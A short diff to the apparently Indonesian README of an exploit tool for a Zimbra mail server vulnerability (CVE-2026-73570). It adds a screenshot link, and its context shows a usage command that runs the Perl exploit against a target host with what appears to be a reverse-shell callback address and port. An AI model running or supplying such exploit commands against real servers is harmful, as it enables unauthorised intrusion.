@@ -170,6 +170,8 @@ Skrip memerlukan Perl beserta modul `IO::Socket::INET`, `IO::Socket::SSL`, `MIME
 
 Contoh penggunaan terhadap satu target:
 
+![Screen Capture](https://raw.githubusercontent.com/gagaltotal/zimbra-cve/refs/heads/main/images/Screenshot%20from%202026-08-28%2021-08-02.png)
+
 ```bash
 cd CVE-2026-73570
 perl CVE-2026-73570.pl -H mail.target.com -r 10.10.10.1 -R 4444
